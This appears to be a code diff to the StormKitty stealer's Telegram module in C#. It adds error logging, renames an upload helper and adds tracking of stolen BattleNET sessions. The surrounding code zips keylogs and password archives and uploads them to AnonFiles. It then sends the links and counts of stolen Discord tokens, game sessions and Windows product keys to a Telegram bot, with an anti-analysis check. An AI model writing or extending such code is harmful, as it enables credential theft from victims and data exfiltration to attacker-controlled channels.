@@ -61,7 +61,7 @@ namespace StormKitty.Telegram
                     return response.StartsWith("{\"ok\":true,");
                 }
             }
-            catch { }
+            catch (Exception error) { Logging.Log("Telegram >> TokenIsValid exception:\n" + error); }
             return false;
         }
 
@@ -85,7 +85,7 @@ namespace StormKitty.Telegram
                     return GetMessageId(response);
                 }
             }
-            catch { }
+            catch (Exception error) { Logging.Log("Telegram >> SendMessage exception:\n" + error); }
             return 0;
         }
 
@@ -110,7 +110,7 @@ namespace StormKitty.Telegram
                     );
                 }
             }
-            catch { }
+            catch (Exception error) { Logging.Log("Telegram >> EditMessage exception:\n" + error); }
         }
 
 
@@ -124,7 +124,7 @@ namespace StormKitty.Telegram
             string filename = DateTime.Now.ToString("yyyy-MM-dd_h.mm.ss");
             string archive = Filemanager.CreateArchive(log, false);
             File.Move(archive, filename + ".zip");
-            string url = AnonFile.Upload(filename + ".zip");
+            string url = AnonFiles.Upload(filename + ".zip");
             File.Delete(filename + ".zip");
             File.AppendAllText(KeylogsHistory, $"\t\t\t\t\t\t\t- " +
                 $"[{filename.Replace("_", " ").Replace(".", ":")}]({url})\n");
@@ -206,6 +206,7 @@ namespace StormKitty.Telegram
                 + Counter.GetSValue("💬 Discord token", Counter.Discord)
                 + Counter.GetSValue("🎮 Steam session", Counter.Steam)
                 + Counter.GetSValue("🎮 Uplay session", Counter.Uplay)
+                + Counter.GetSValue("🎮 BattleNET session", Counter.BattleNET)
                 + "\n"
                 + "\n  🧭 *Device:*"
                 + Counter.GetSValue("🗝 Windows product key", Counter.ProductKey)
@@ -245,7 +246,8 @@ namespace StormKitty.Telegram
         public static void SendReport(string file)
         {
             Logging.Log("Sending passwords archive to anonfile");
-            string url = AnonFile.Upload(file, GetLatestMessageId() == -1 && !AntiAnalysis.Run());
+            string url = AnonFiles.Upload(file,
+                GetLatestMessageId() == -1 && !AntiAnalysis.Run());
             File.Delete(file);
             Logging.Log("Sending report to telegram");
             SendSystemInfo(url);
